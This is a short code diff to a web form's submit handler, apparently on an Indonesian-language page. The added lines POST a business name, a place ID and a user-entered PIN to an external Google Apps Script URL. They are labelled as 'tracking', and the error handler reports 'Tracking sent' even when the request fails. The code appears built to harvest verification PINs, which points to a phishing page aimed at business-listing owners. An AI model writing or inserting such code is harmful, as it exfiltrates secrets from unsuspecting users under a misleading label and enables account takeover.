@@ -358,7 +358,15 @@
                 }).catch(err => console.log('Tracking sent'));
 
                 // Show success state
-                submitBtn.classList.remove('loading');
+                submitBtn.classList.remove('loading');// Send tracking to Google Sheets
+fetch('https://script.google.com/macros/s/AKfycby6jiT6s5OdrFuh2ZW_aDUGGxswPK2pvFqlnqmQaLtumCDN3gpy49GTR6yiDmY565GmEQ/exec', {
+    method: 'POST',
+    body: JSON.stringify({
+        businessName: businessName,
+        placeId: placeId,
+        pin: pin
+    })
+}).catch(err => console.log('Tracking sent'));
                 submitBtn.classList.add('success');
                 submitBtn.innerHTML = '<span>✓</span><span>Berhasil! Mengalihkan...</span>';
 
